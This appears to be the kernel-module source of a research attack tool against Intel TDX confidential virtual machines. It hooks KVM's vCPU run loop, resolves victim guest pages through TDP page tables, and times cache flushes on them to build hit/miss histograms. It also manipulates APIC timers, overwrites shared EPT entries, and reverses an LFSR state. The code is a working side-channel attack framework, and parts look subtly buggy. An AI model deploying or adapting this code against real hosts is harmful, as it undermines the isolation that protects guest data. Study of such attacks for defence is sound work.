#include <linux/init.h>
#include <linux/types.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <asm/io.h>
#include <asm/smp.h>
#include <asm/tlbflush.h>
#include <linux/slab.h>
#include <asm/desc.h>
#include <asm/current.h>
#include <linux/context_tracking.h>
#include <linux/cdev.h>
#include <asm/desc.h>
#include <asm/apic.h>
#include <asm/msr-index.h>
#include <linux/delay.h>
#include <linux/gfp.h>
#include <linux/module.h> /* Needed by all modules */ 
#include <asm/uaccess.h>
#include <linux/printk.h> /* Needed for pr_info() */ 
#include <linux/completion.h>
#include <linux/kthread.h>
#include <linux/threads.h>
#include <asm/unwind_hints.h>
#include <linux/objtool.h>
#include <linux/debugfs.h>
#include <linux/vmalloc.h>
#include "int.h"
#define ATTACKER KERN_INFO "attacker: "
#define IA32_TSC_DEADLINE 0x6e0
volatile uint64_t result = 0;
volatile uint64_t done = 0;

void serialize_(void) {
  asm volatile("serialize":::"memory");
}

int ioctl_major = 0;
int ioctl_minor = 0;
struct class *chardev_class = NULL;

static long ioctl(struct file *filp, unsigned int cmd, unsigned long arg);
struct file_operations ioctl_interface_fops = {
	.owner = THIS_MODULE,
	.read = NULL,
	.write = NULL,
	.open = NULL,
	.unlocked_ioctl = ioctl,
	.release = NULL,
  .mmap = NULL
};
struct cdev cdev = {
  .owner = THIS_MODULE,
  .ops = &ioctl_interface_fops
};

uint64_t rdtsc_nofences(void) {
  uint64_t a, d;
  asm volatile("rdtsc" : "=a"(a), "=d"(d) ::"memory");
  return (d << 32) | a;
}
void mfence(void) {
  asm volatile("mfence":::"memory");
}
void lfence(void) {
  asm volatile("lfence":::"memory");
}

uint64_t rdtsc_nofences_(void) {
  uint64_t a, d;
  asm volatile("rdtsc" : "=a"(a), "=d"(d) ::"memory");
  return (d << 32) | a;
}

void clflush_(void *mem) {
  asm volatile("clflush (%0)"::"r"(mem):"memory");
}
size_t accessed(void *addr) {
  size_t sum = 0;
  size_t i = 0;
  mfence();
  size_t b = rdtsc_nofences();
  //maccess(addrr);
  clflush_(addr);
  mfence();
  size_t e = rdtsc_nofences();
  //printk("TDX2: %lld\n", e-b);
  mfence();
  return e-b;
}
 

void update_tsc_deadline(void) {
  size_t beg = rdtsc_nofences_()+2000000000/10;
  asm volatile ("wrmsr" :: "c"(IA32_TSC_DEADLINE), "a"(beg), "d"(beg>>32):"memory");
}


extern void (* volatile vcpu_run_beg_hook)(struct OutData *);
extern void (* volatile vcpu_run_end_hook)(struct OutData *);
extern void (* volatile vcpu_run_end_hook2)(void *);


void dumpSharedEPT(uint64_t eptp) {
  eptp &= ~0xfffULL;
  uint64_t *epml4_virt = page_address(pfn_to_page(eptp/4069ULL));
  uint64_t i = 0;
  for (i = 0; i < 512; ++i) printk("EPML4: %llx: %llx\n", i, epml4_virt[i]);
  for (i = 0; i < 512; ++i)
  epml4_virt[i] = -1ULL;
}

static bool page_mapping_exist(unsigned long addr, size_t size) {
    pgd_t *pgd;
    p4d_t *p4d;
    pmd_t *pmd;
    pud_t *pud;
    pte_t *pte;
    struct mm_struct *mm = current->mm;
    unsigned long end_addr;
    pgd = pgd_offset(mm, addr);
    if (unlikely(!pgd) || unlikely(pgd_none(*pgd)) || unlikely(!pgd_present(*pgd)) )
        return false;
    p4d = p4d_offset(pgd, addr);

    if (unlikely(!p4d) || unlikely(p4d_none(*p4d)) || unlikely(!p4d_present(*p4d)) )
        return false;
    
    pud = pud_offset(p4d, addr);
    if (unlikely(!pud) || unlikely(pud_none(*pud)) || unlikely(!pud_present(*pud)))
        return false;

    pmd = pmd_offset(pud, addr);
    if (unlikely(!pmd) || unlikely(pmd_none(*pmd)) || unlikely(!pmd_present(*pmd)))
        return false;

    if (pmd_trans_huge(*pmd)) {
        end_addr = (((addr >> PMD_SHIFT) + 1) << PMD_SHIFT) - 1;
        goto end;
    }
    pte = pte_offset_kernel(pmd, addr);
    if (unlikely(!pte) || unlikely(!pte_present(*pte)))
        return false;
    end_addr = (((addr >> PAGE_SHIFT) + 1) << PAGE_SHIFT) - 1;
end:
    if (end_addr >= addr + size - 1)
        return true;
    return page_mapping_exist(end_addr + 1, size - (end_addr - addr + 1));
}

static bool addr_valid(unsigned long addr, size_t size) {
    int i;
    for (i = 0; i < size; i++) {
        if (!virt_addr_valid(addr + i))
            return false;
    }
    if (!page_mapping_exist(addr, size))
        return false;
    return true;
}
int injected = 0;
int old_timer = 0;

uint64_t old_lvt_timer = 0;


int inj = 0;


uint64_t start_tsc;

atomic_t unloading;


atomic_t t_mode;

#define OFFSET (4096)



unsigned long int_buffer[8] = {};
int buf_int = 0;



char *debug_buffer;
size_t debug_len;
const size_t debug_max = 1024ULL*1024ULL*1024ULL;
static struct dentry *data_file;
static struct dentry *subdir;

static ssize_t data_read(struct file *, char *, size_t, loff_t *);
static ssize_t data_read(struct file *f, char *buffer,
		size_t len, loff_t *offset) {
	return simple_read_from_buffer(buffer, len, offset, debug_buffer, debug_len);
}

int printDebug(const char *fmt, ...) {
    if (debug_len == debug_max) debug_len = 0;
    //int i = snprintf(debug_buffer+debug_len, debug_max-debug_len, "[%llu] ", rdtsc());
    int i = 0;
    debug_len += i;
    if (debug_len == debug_max) debug_len = 0;
    va_list args; 

    va_start(args, fmt);
    i = vsnprintf(debug_buffer+debug_len, debug_max-debug_len, fmt, args);
    va_end(args);
    debug_len += i;

    return i;
}


char *getAddr(struct OutData *vcpu, size_t pfn) {
  struct kvm_mmu_page *node;
  struct tdp_iter iter;

  //printk("TDX phys: %lx\n", vcpu->mmu->next->next->next);
  //printk("TDX phys: %lx\n", vcpu->mmu->next);
  list_for_each_entry(node, vcpu->mmu_root, link) {
    for_each_tdp_pte_min_level(iter, node, PG_LEVEL_4K, pfn,pfn+1) {
    
      if (iter.old_spte&0b111) {
  	if (iter.gfn == pfn ) {
	  return  (char*)__va((iter.old_spte&~0xfffULL)&((1ULL<<51)-1));
  	}
      }
    }
  }
  printk("TDX phys: no 4k page found\n");
  list_for_each_entry(node, vcpu->mmu_root, link) {
    for_each_tdp_pte_min_level(iter, node, PG_LEVEL_2M, pfn,pfn+1) {
    
      if (iter.old_spte&0b111) {
  	if (iter.gfn == (pfn&~0x1ffULL)) {
	  return  (char*)__va(((iter.old_spte&~0xfffULL)&((1ULL<<51)-1))+(pfn&0x1ffULL)*4096);
  	}
      }
    }
  }
  printk("not found %lx\n", pfn);
  return 0;
}


void *attacker_td;
const uint32_t MASK = 0xB4BCD35C;

uint8_t lfsr_outputs[40];
size_t lfsr_cnt = 0;
uint32_t state = 0;

void lfsrStep(void) {
  uint8_t s = state&1;
  state = state>>1;
  if (s) state ^= MASK;
}

void reverseState(void) {
  for (size_t i = 31; i < 40; --i) {
    size_t c = lfsr_outputs[i]&1;
    if (c) state = state ^ MASK;
    state = (state<<1) | c;
  }
  for (size_t i = 0; i < 31; ++i) lfsrStep();
}


void hook1(struct OutData *vcpu) {
  return;
  
  if(atomic_read(&unloading)) {
     apic->write(0x320, 0x400ec);
     apic->write(0x380, old_timer);
     update_tsc_deadline();
     return;
   }
  struct kvm_vcpu_arch *arch = (struct kvm_vcpu_arch *)vcpu->kvm_vcpu_arch;

  if (inj) {
    
    injected = 1;
    inj = 0;
    serialize();
    apic->write(0x320, 0xecU);
    apic->write(0x380, 2);
    
    //start_tsc = rdtsc_nofences_();
  }
}
struct tdx_module_args {
  /* callee-clobbered */
  u64 rcx;
  u64 rdx;
  u64 r8;
  u64 r9;
  /* extra callee-clobbered */
  u64 r10;
  u64 r11;
  /* callee-saved + rdi/rsi */
  u64 r12;
  u64 r13;
  u64 r14;
  u64 r15;
  u64 rbx;
  u64 rdi;
  u64 rsi;
};
u64 __seamcall_saved_ret(u64 fn, struct tdx_module_args *args);



uint64_t stepcnt = 0;

volatile void* victim_td;


uint32_t hit_hist[1024];
uint32_t miss_hist[1024];


char *adddr;


void hook2(struct OutData *vcpu) {
  if(atomic_read(&unloading)) {
     apic->write(0x320, 0x400ec);
     apic->write(0x380, old_timer);
     update_tsc_deadline();
     return;
   }


  //uint64_t reason = vcpu->exit_reason;
  //uint64_t reg_bitmap = vcpu->kvm_vcpu_arch[VCPU_REGS_RCX];
  uint64_t vspec_vmcall = vcpu->kvm_vcpu_arch[VCPU_REGS_R10];
  uint64_t vmcall_leaf = vcpu->kvm_vcpu_arch[VCPU_REGS_R11];

  int is_vmcall = vcpu->exit_reason == 0x4d;
  if (is_vmcall && vmcall_leaf == CPUID && vcpu->kvm_vcpu_arch[VCPU_REGS_R12] == 0x40000068ULL) {}
  if (is_vmcall && vmcall_leaf == CPUID && vcpu->kvm_vcpu_arch[VCPU_REGS_R12] == 0x40000069ULL) {
    adddr = getAddr(vcpu, vcpu->kvm_vcpu_arch[VCPU_REGS_R13]);
    if (adddr)
    accessed(adddr);
    else printDebug("addr error\n");
  }
  if (is_vmcall && vmcall_leaf == CPUID && vcpu->kvm_vcpu_arch[VCPU_REGS_R12] == 0x40000070ULL && adddr) {
    size_t val = accessed(adddr);
    val = val > 1024 ? (1024-1) : val;
    if (vcpu->kvm_vcpu_arch[VCPU_REGS_R13] == 1) {
      ++hit_hist[val];
    }
    if (vcpu->kvm_vcpu_arch[VCPU_REGS_R13] == 2) {
      ++miss_hist[val];
    }
  }
  if (is_vmcall && vmcall_leaf == CPUID && vcpu->kvm_vcpu_arch[VCPU_REGS_R12] == 0x40000071ULL) {
    printDebug("hit = [");
    for (size_t i = 0; i < 1024; ++i) printDebug("%u, ", hit_hist[i]);
    printDebug("]\n");
    printDebug("miss = [");
    for (size_t i = 0; i < 1024; ++i) printDebug("%u, ", miss_hist[i]);
    printDebug("]\n");
  }


}

void * volatile last;

void hook3(void *vcpu) {
  while (vcpu==victim_td && (atomic_read(&t_mode) == 1 || atomic_read(&t_mode) == 2 || atomic_read(&t_mode) == 100) && !atomic_read(&unloading)) {
      yield();
  }
  while (vcpu==attacker_td && (atomic_read(&t_mode) == 3) && !atomic_read(&unloading)) {
      yield();
  }
  if(atomic_read(&unloading)) {
     apic->write(0x320, 0x400ec);
     apic->write(0x380, old_timer);
     update_tsc_deadline();
     return;
   }
 
}

static long ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
  long ret = -1;
  struct Args args;

  switch (cmd) {
    case COLLECT:
      ret = copy_from_user(&args, (void*)arg, sizeof(struct Args));
      done = 0;
      if (ret != 0) break;
      break;
    case END:
      done = 1;
      ret = 0;
      break;
    default:
      printk(ATTACKER "ioctl cmd not found\n");
      ret = -1;
      break;
  }
  return ret;
}


const struct file_operations data_file_fops = {
	.owner = THIS_MODULE,
	.read = data_read,
};

int init_module(void) 
{
  atomic_set(&t_mode, 0);
  atomic_set(&unloading, 0);


  //dev_t devno;
  //int error = alloc_chrdev_region(&devno, ioctl_minor, 1, DEVICE_NAME);
  //ioctl_major = MAJOR(devno);
  //if (error < 0) {
  //  return -1;
  //}
  //devno = MKDEV(ioctl_major, ioctl_minor);
  //cdev_init(&cdev, &ioctl_interface_fops);
  //cdev.owner = THIS_MODULE;
  //error = cdev_add(&cdev, devno, 1);
  //if (error < 0) {
  //  cdev_del(&cdev);
  //  unregister_chrdev_region(devno, 1);
  //  return -1;
  //}

  //chardev_class = class_create(DEVICE_NAME);
  //device_create(chardev_class, NULL, devno, NULL, DEVICE_NAME);
  debug_buffer = vmalloc(1024ULL*1024ULL*1024ULL);
  if (!debug_buffer) {
    return -1;
  }
  subdir = debugfs_create_dir("tdxmod", NULL);
  if (!subdir) {
    vfree(debug_buffer);
    return -1;
  }
  data_file = debugfs_create_file("data", 0644, subdir, NULL, &data_file_fops);
  if (!data_file) {
    vfree(debug_buffer);
    debugfs_remove_recursive(subdir);
    return -1;
  }
  printDebug("loading\n");
  vcpu_run_beg_hook = (void *)hook1;
  vcpu_run_end_hook = (void *)hook2;
  vcpu_run_end_hook2 = (void *)hook3;
  return 0;

} 

 

void cleanup_module(void) 
{ 
  atomic_set(&unloading, 1);
  printDebug("unload.\n"); 
  debugfs_remove_recursive(subdir);
  vfree(debug_buffer);
  //dev_t devno = MKDEV(ioctl_major, ioctl_minor);
  //device_destroy(chardev_class, devno);
  //class_destroy(chardev_class);

  //cdev_del(&cdev);
  //unregister_chrdev_region(devno, 1);
  vcpu_run_beg_hook = 0;
  vcpu_run_end_hook = 0;
  vcpu_run_end_hook2 = 0;
  msleep(1000);
} 

 

MODULE_LICENSE("GPL");
